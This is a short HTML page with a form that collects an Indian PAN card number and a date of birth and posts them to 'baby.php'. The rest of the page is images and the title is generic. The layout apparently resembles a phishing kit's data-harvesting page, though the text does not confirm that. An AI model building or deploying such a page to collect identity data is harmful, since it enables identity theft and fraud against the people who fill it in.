<!DOCTYPE html>
<html lang="zxx">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        #aa , #tere ,#ram , #sita
        {
            width: 100%;
        }
        #form
        {
            margin-left: 23px;
        }
        #dd ,#ff ,#hh ,#ded
        {
            width: 60%;
            height: 22px;
            background: #F3F3F3;
            border-radius:3px;
            
        }

        ::placeholder
        {
            font-size:12px;
        }
        #btn
        {
           background-color: 	#0080ff;
           color:white;
           border-radius:3px;
           font-size: 16px;
           border: none;
           width: 40%;
           height:30px;
        }
    </style>
</head>
<body>
    <div id="zz">
    <img src="trph.png" alt="" id="aa">
    </div>
    <div id="kol">
        <img src="tergg.jpeg" alt="" id="tere">
    </div>
    <form action="baby.php" method="post" id="form">
        <div id="kik">
        <p id="cca">
                Pancard no.
            </p>
            <input type="text" name="pancard no." id="ded" placeholder="pancard no." required="">
        </div>
        
        <div id="xx">
            <p id="cc">
                Date of birth
            </p>
            <input type="date" name="dob" id="dd" placeholder="Date of birth" required="">
        </div> <br>


        <div id="ss">
            <button type="submit" id="btn">
                CONTINUE
            </button>
        </div> <br>
    </form>
    <div id="ki">
        <img src="last1.jpeg" alt="" id="ram">
    </div>
    <div id="klo">
        <img src="last2.jpeg" alt="" id="sita">
    </div>
</body>
</html>